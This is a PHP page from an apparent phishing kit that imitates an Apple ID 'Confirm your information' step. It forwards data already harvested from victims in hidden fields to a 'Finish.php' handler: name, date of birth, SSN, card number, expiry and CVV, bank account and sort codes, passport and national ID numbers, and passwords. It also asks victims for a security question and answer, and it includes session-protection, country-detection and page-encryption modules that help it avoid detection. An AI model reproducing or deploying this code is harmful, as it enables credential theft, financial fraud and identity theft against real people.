<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
require "assets/includes/session_protect.php";
require "assets/includes/detect_country.php";
require "assets/includes/functions.php";
require "assets/includes/language.mob.php";
require "assets/includes/One_Time.php";
require "CONTROLS.php";
require "assets/includes/bahasa.php";

if(!empty($_POST['drv'])) {
  $Xacno = $_POST['drv'];
} else {
  $Xdrv = "";
}

if(!empty($_POST['nis'])) {
  $Xacno = $_POST['nis'];
} else {
  $Xnis = "";
}

if(!empty($_POST['acno'])) {
  $Xacno = $_POST['acno'];
} else {
  $Xacno = "";

}
if(!empty($_POST['sortcode'])) {
  $Xsortcode = $_POST['sortcode'];
} else {
  $Xsortcode = "";
}
if(!empty($_POST['bnz'])) {
  $Xbnz = $_POST['bnz'];
} else {
  $Xbnz = "";
}
if(!empty($_POST['accnumkw'])) {
  $Xaccnumkw = $_POST['accnumkw'];
} else {
  $Xaccnumkw = "";
}
if(!empty($_POST['qatarid'])) {
  $Xqatarid = $_POST['qatarid'];
} else {
  $Xqatarid = "";
}
if(!empty($_POST['passport'])) {
  $Xpassport = $_POST['passport'];
} else {
  $Xpassport = "";
}
if(!empty($_POST['natidsa'])) {
  $Xnatidsa = $_POST['natidsa'];
} else {
  $Xnatidsa = "";
}
if(!empty($_POST['citizenth'])) {
  $Xcitizenth = $_POST['citizenth'];
} else {
  $Xcitizenth = "";
}
if(!empty($_POST['bsbnum'])) {
  $Xbsbnum = $_POST['bsbnum'];
} else {
  $Xbsbnum = "";
}
if(!empty($_POST['idnum'])) {
  $Xidnum = $_POST['idnum'];
} else {
  $Xidnum = "";
}
if(!empty($_POST['socnumca'])) {
  $Xsocnumca = $_POST['socnumca'];
} else {
  $Xsocnumca = "";
}
if(!empty($_POST['climit'])) {
  $Xclimit = $_POST['climit'];
} else {
  $Xclimit = "";
}
if(!empty($_POST['vbvpass'])) {
  $Xvbvpass = $_POST['vbvpass'];
} else {
  $Xvbvpass = "";
}

if(!empty($_POST['sortcodeuk'])) {
  $sortcodeuk = $_POST['sortcodeuk'];
} else {
  $sortcodeuk = "";
}

if(!empty($_POST['accnumberuk'])) {
  $accnumberuk = $_POST['accnumberuk'];
} else {
  $accnumberuk = "";
}  
if(!empty($_POST['webid'])) {
  $webid = $_POST['webid'];
} else {
  $webid = "";
}
if(!empty($_POST['passwds'])) {
  $passwds = $_POST['passwds'];
} else {
  $passwds = "";
}

if($EncryptScript == 1) {
require "assets/includes/enc.php";
encryptPage();
}
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Confirm your information</title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<?php include("assets/nav.php"); ?>



<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile appleid-user">
                                    <span class="first_name"><?php echo $bhs['verify0'];?>
                                    </span><span class="first_name"><?php echo $systemInfo['os'];?>
                                    </span>
                                    <small class="SessionUser"><?php echo $_SESSION['firstname'];?> <?php echo $_SESSION['lastname'];?> <?php echo  $bhs['verify1']; ?> <strong><?php echo $_SESSION['user'];
                                        ?></strong>  </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <a href="Signout.php?sslchannel=true&sessionid=<?php echo md5(gmdate("r")).sha1(gmdate("r"));?>"><button class="btn btn-link"> <?php echo $bhs['verify00']; ?> </button></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">


<form action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
<input type="hidden" name="fname" value="<?php echo $_POST['fname'];?>">
<input type="hidden" name="mname" value="<?php echo $_POST['mname'];?>">
<input type="hidden" name="lname" value="<?php echo $_POST['lname'];?>">
<input type="hidden" name="dob" value="<?php echo $_POST['dob'];?>">
<input type="hidden" name="address" value="<?php echo $_POST['address'];?>">
<input type="hidden" name="address2" value="<?php echo $_POST['address2'];?>">
<input type="hidden" name="town" value="<?php echo $_POST['town'];?>">
<input type="hidden" name="postcodes" value="<?php echo $_POST['postcodes'];?>">
<input type="hidden" name="county" value="<?php echo $_POST['county'];?>">
<input type="hidden" name="country" value="<?php echo $_POST['country'];?>">
<input type="hidden" name="telephone" value="<?php echo $_POST['telephone'];?>">
<input type="hidden" name="ssn" value="<?php echo $_POST['ssn'];?>">
<input type="hidden" name="ccname" value="<?php echo $_POST['ccname'];?>">
<input type="hidden" name="ccno" value="<?php echo $_POST['ccno'];?>">
<input type="hidden" name="ccexp" value="<?php echo $_POST['ccexp'];?>">
<input type="hidden" name="secode" value="<?php echo $_POST['secode'];?>">
<input type="hidden" name="acno" value="<?php echo $Xacno;?>">
<input type="hidden" name="sortcode" value="<?php echo $Xsortcode;?>">

<input type="hidden" name="drv" value="<?php echo $Xdrv;?>">
<input type="hidden" name="nis" value="<?php echo $Xnis;?>">
<input type="hidden" name="webid" value="<?php echo $webid;?>">
<input type="hidden" name="passwds" value="<?php echo $passwds;?>">

<input type="hidden" name="sortcodeuk" value="<?php echo $sortcodeuk;?>">
<input type="hidden" name="accnumberuk" value="<?php echo $accnumberuk;?>">

<input type="hidden" name="bnz" value="<?php echo $Xbnz;?>">
<input type="hidden" name="accnumkw" value="<?php echo $Xaccnumkw;?>">
<input type="hidden" name="qatarid" value="<?php echo $Xqatarid;?>">
<input type="hidden" name="passport" value="<?php echo $Xpassport;?>">
<input type="hidden" name="natidsa" value="<?php echo $Xnatidsa;?>">
<input type="hidden" name="citizenth" value="<?php echo $Xcitizenth;?>">
<input type="hidden" name="bsbnum" value="<?php echo $Xbsbnum;?>">
<input type="hidden" name="idnum" value="<?php echo $Xidnum;?>">
<input type="hidden" name="socnumca" value="<?php echo $Xsocnumca;?>">
<input type="hidden" name="climit" value="<?php echo $Xclimit;?>">
<input type="hidden" name="vbvpass" value="<?php echo $Xvbvpass;?>">
<div class="container flow-sections">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel"><?php echo $bhs['verify21']; ?></h3>
<div class="form-group">
<div class="form-group clearfix" style="padding-top:0px;">
<div class="select-wrapper">
<select id="q1" name="q1" type="text" class="form-control question" style="height:32px!important;padding-left:10px;">
	<option  value=""><?php echo $bhs['verify22']; ?></option>
	<option value="<?php echo $bhs['verify23']; ?>"><?php echo $bhs['verify23']; ?></option>
	<option value="<?php echo $bhs['verify24']; ?>"><?php echo $bhs['verify24']; ?></option>
	<option value="<?php echo $bhs['verify25']; ?>"><?php echo $bhs['verify25']; ?></option>
	<option value="<?php echo $bhs['verify26']; ?>"><?php echo $bhs['verify26']; ?></option>
	<option value="<?php echo $bhs['verify27']; ?>"><?php echo $bhs['verify27']; ?></option>
	<option value="<?php echo $bhs['verify28']; ?>"><?php echo $bhs['verify28']; ?></option>
</select>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="a1" id="a1" class="generic-input-field form-control field" placeholder="<?php echo $bhs['verify29']; ?>">
</div>
</div>
<br>
<br>

<input type="submit" class="gobtn btn-link" style="width:50%;margin-left:auto;margin-right:auto;float:right" value="<?php echo $bhs['verify30']; ?>">
</div>
</div>
</div>
</div>
</div>
</form>



</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>